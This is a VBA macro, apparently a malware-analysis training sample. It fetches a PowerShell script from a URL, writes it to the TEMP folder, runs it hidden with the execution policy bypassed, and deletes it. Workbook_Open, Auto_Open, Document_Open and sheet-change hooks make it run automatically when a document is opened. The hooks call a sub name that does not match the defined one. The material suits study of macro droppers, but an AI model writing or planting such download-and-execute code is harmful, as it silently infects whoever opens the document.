' This code retrieves a PowerShell script from a specified URL, then creates a temp PowerShell file, in the TEMP folder, 
 'then wrights the contents of the txt file inside and executes it. After that it delete the temp .ps1 file

' Execution starts automatically or after the user changes to a diffrent sheet.
Sub ExecuteScriptFromURL()
    Dim URL As String
    URL = "https://raw.githubusercontent.com/omerwwazap/Practical-Malware-Analysis-Self-Study/main/Bootcamp/Download_encoded_ps.ps1"
    
    Dim ScriptContent As String
    ScriptContent = GetTextFromURL(URL)
    
    ' Execute the script in PowerShell
    ExecutePowerShellScript ScriptContent

End Sub

Function GetTextFromURL(URL As String) As String
    Dim objHTTP As Object
    Set objHTTP = CreateObject("MSXML2.XMLHTTP")
    
    objHTTP.Open "GET", URL, False
    objHTTP.send
    
    If objHTTP.Status = 200 Then
    Application.Wait (Now + TimeValue("00:00:01"))
        GetTextFromURL = objHTTP.responseText
    Else
        GetTextFromURL = ""
    End If
    
    Set objHTTP = Nothing
End Function

Sub ExecutePowerShellScript(ScriptContent As String)
    Dim objShell As Object
    Set objShell = CreateObject("WScript.Shell")
    
    Dim tempFilePath As String
    tempFilePath = Environ("TEMP") & "\temp.ps1"
    
    ' Write the script content to a temporary file
    Dim fileObject As Object
    Set fileObject = CreateObject("Scripting.FileSystemObject")
    
    Dim fileStream As Object
    Set fileStream = fileObject.CreateTextFile(tempFilePath, True)
    
    fileStream.Write ScriptContent
    fileStream.Close
    Application.Wait (Now + TimeValue("00:00:01"))
    ' Execute the temporary PowerShell script
    objShell.Run "powershell.exe -ExecutionPolicy Bypass -File " & Chr(34) & tempFilePath & Chr(34), 0
    Application.Wait (Now + TimeValue("00:00:01"))
    ' Delete the temporary file
    fileObject.DeleteFile tempFilePath
    
    Set objShell = Nothing
    Set fileStream = Nothing
    Set fileObject = Nothing
End Sub

Private Sub Workbook_Open() ' Run when you open a workbook
    ExecutePowerShellFromURL
End Sub

Sub Auto_Open() 'Run when open
    ExecutePowerShellFromURL
End Sub

Private Sub worksheet_change(ByVal Target As Range) 'Run when sheet change open
    ExecutePowerShellFromURL 
End Sub

Sub Document_Open()  'Run when document opens
    ExecutePowerShellFromURL
End Sub